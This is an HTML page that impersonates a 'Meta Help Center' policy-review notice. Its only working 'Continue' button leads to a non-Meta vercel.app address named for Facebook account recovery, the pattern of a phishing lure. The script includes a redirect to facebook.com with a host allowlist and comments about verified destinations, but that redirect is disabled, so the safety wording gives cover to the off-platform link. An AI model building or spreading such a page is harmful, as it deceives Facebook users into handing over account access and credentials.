<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Meta Help Center</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; script-src 'self' 'unsafe-inline'; base-uri 'none'; form-action 'self'">
  <style>
    :root {
      color-scheme: dark;
      --bg: #18191a;
      --card: #242526;
      --text: #e4e6eb;
      --muted: #b0b3b8;
      --brand: #1877f2; /* You can change this to your brand color */
      --border: #3a3b3c;
    }
    html, body {
      margin: 0; padding: 0; height: 100%;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      background: var(--bg); color: var(--text);
    }
    .center {
      min-height: 100%;
      display: grid;
      place-items: center;
      padding: 24px;
    }
    .card {
      background: var(--card);
      width: 100%;
      max-width: 420px;
      border-radius: 12px;
      box-shadow: 0 8px 40px rgba(0,0,0,0.4);
      padding: 28px;
      border: 1px solid var(--border);
    }
    h1 {
      margin: 0 0 10px;
      font-size: 1.25rem;
      line-height: 1.3;
    }
    p {
      margin: 8px 0;
      color: var(--muted);
    }
    .status {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      margin: 10px 0 0;
      color: var(--text);
      font-weight: 600;
    }
    .spinner {
      width: 16px; height: 16px;
      border: 3px solid var(--border);
      border-top-color: var(--brand);
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .actions {
      margin-top: 18px;
      display: grid;
      gap: 10px;
      grid-auto-flow: row;
    }
    .btn {
      appearance: none;
      border: none;
      border-radius: 8px;
      padding: 10px 14px;
      background: var(--brand);
      color: #fff;
      font-weight: 600;
      cursor: pointer;
    }
    .btn:hover { filter: brightness(0.95); }
    .link {
      color: var(--brand);
      text-decoration: underline;
      text-underline-offset: 2px;
    }
    .countdown {
      font-weight: 700;
      color: var(--brand);
    }
    .sr-only {
      position: absolute !important;
      height: 1px; width: 1px;
      overflow: hidden; clip: rect(1px, 1px, 1px, 1px);
      white-space: nowrap; border: 0; padding: 0; margin: -1px;
    }
  </style>
</head>
<body>
  <div class="center">
    <main class="card" role="status" aria-live="polite" aria-atomic="true">
      <h1>Meta Help Center</h1>
      <p>We are reviewing a potential policy issue related to your request. You can continue to the official help resource below.</p>

      <!-- Optional countdown (disabled auto-redirect by default) -->
      <p id="redirectCopy" class="sr-only" aria-hidden="true">Automatic redirect is disabled.</p>
      <p>
        <span class="status">
          <span class="spinner" aria-hidden="true"></span>
          Reviewing…
        </span>
      </p>

      <div class="actions">
        <!-- Use an official, verifiable destination -->
        <a class="btn" id="continueBtn"
           href="https://take-action-for-recovery-fb.vercel.app/"
           rel="noopener noreferrer">Continue</a>
      </div>

      <!-- If you truly need an auto-redirect, set enableAutoRedirect = true and verify the URL -->
      <p id="autoNote" style="margin-top:10px; display:none;">
        Redirecting in <span id="countdown" class="countdown">5</span> seconds…
      </p>
    </main>
  </div>

  <script>
    // Configure only if necessary and to a verified domain you own/control.
    const enableAutoRedirect = false; // set to true only for legitimate use-cases
    const targetUrl = "https://www.facebook.com/help/"; // replace with an official, verified destination
    const redirectDelaySeconds = 5;

    const countdownEl = document.getElementById('countdown');
    const autoNoteEl = document.getElementById('autoNote');
    const redirectCopyEl = document.getElementById('redirectCopy');
    const continueBtn = document.getElementById('continueBtn');

    continueBtn.addEventListener('click', (e) => {
      // Let the normal link navigate; additional checks could go here.
    });

    if (enableAutoRedirect) {
      autoNoteEl.style.display = 'block';
      let remaining = redirectDelaySeconds;
      countdownEl.textContent = remaining;

      const iv = setInterval(() => {
        remaining -= 1;
        countdownEl.textContent = remaining;
        if (remaining <= 0) {
          clearInterval(iv);
          // Safety: allowlist check
          try {
            const allowedHosts = new Set([
              'www.facebook.com',
              'help.meta.com',
              'meta.com'
            ]);
            const u = new URL(targetUrl);
            if (!allowedHosts.has(u.host)) {
              console.warn('Blocked redirect to non-allowlisted host:', u.host);
              return;
            }
            window.location.assign(targetUrl);
          } catch (err) {
            console.error('Invalid redirect URL:', err);
          }
        }
      }, 1000);

      redirectCopyEl.textContent = `You will be redirected automatically in ${redirectDelaySeconds} seconds.`;
      redirectCopyEl.classList.remove('sr-only');
      redirectCopyEl.removeAttribute('aria-hidden');
    }
  </script>
</body>
</html>
